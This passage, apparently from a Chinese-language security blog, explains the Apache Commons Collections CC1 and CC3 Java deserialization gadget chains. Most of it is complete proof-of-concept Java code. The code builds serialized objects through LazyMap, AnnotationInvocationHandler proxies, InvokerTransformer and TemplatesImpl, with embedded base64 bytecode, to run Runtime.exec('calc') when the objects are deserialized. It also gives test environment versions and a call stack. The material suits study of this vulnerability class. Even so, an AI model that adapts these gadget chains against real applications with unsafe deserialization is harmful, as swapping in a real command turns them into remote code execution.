class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">//字节码</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射设置 Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="CC1-7"><a href="#CC1-7" class="headerlink" title="CC1-7"></a>CC1-7</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>通过 AnnotationInvocationHandler 类触发 LazyMap 的 get 方法。<br>简化版 AnnotationInvocationHandler 类的代码：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数，可传入 LazyMap</span></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用 invoke 方法可实现调用 LazyMap#get</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>AnnotationInvocationHandler 类 readObject 方法代码：关键点在 this.memberValues.entrySet() ，这里我们可以为 memberValues 传入一个代理对象。通过 java 的动态代理机制，使其最终触发 AnnotationInvocationHandler 类的 invoke 方法，从而实现触发 LazyMap.get()。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><strong>测试环境</strong>：3.1-3.2.1 jdk版本小于u71</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformer数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//反射获取AnnotationInvocationHandler实例</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           </span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(handler1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//测试反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>调用栈</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;mapProxy.entrySet().iterator()  <span class="comment">//动态代理类</span></span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;ConstantTransformer.transform()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                    -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk7u21及以前</p><p>对 CC1 进行了一些修改。引入了 TemplatesImpl 来加载字节码，去掉了 InvokerTransformer ，引入了 InstantiateTransformer。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//字节码</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射设置 Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Transformer数组</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//LazyMap实例</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取AnnotationInvocationHandler实例</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//动态代理类，为了触发 AnnotationInvocationHandler#invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(handler1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//测试反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span 